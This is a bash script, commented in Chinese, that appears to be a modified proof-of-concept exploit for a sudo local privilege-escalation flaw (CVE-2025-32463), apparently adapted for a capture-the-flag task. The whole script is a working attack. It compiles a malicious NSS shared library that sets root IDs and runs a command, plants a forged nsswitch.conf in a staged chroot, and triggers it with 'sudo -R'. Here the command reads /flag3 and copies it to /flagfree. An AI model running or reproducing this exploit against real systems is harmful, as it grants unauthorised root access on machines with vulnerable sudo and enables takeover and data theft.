#!/bin/bash
# sudo-chwoot.sh - 修改版
# CVE-2025-32463 – Sudo EoP Exploit PoC
# 用于非交互式环境执行 cat /flag3 并写入 /flagfree

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

# 执行 cat /flag3 并同时写入 /flagfree
CMD="cat /flag3 | tee /flagfree"

# 转义命令用于C字符串
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

# 创建恶意共享库源代码
cat > woot1337.c << EOF
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

__attribute__((constructor)) void woot(void) {
  // 设置root权限
  setreuid(0,0);
  setregid(0,0);
  
  // 执行命令 - 同时输出到stdout和/flagfree文件
  system("cat /flag3 | tee /flagfree");
  
  // 确保进程正常退出
  _exit(0);
}
EOF

# 创建必要的目录结构
mkdir -p woot/etc libnss_

# 配置nsswitch.conf指向我们的恶意库
echo "passwd: /woot1337" > woot/etc/nsswitch.conf

# 复制必要的系统文件
cp /etc/group woot/etc/ 2>/dev/null || true

# 编译恶意共享库
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c 2>/dev/null

# 执行漏洞利用
echo "正在利用漏洞获取flag..."
sudo -R woot woot 2>/dev/null

# 验证文件是否已创建
if [ -f "/flagfree" ]; then
    echo "成功：flag已写入 /flagfree"
    echo "/flagfree 内容:"
    cat /flagfree
else
    echo "警告：/flagfree 文件未创建，可能执行失败"
fi

# 清理临时文件
rm -rf ${STAGE?}
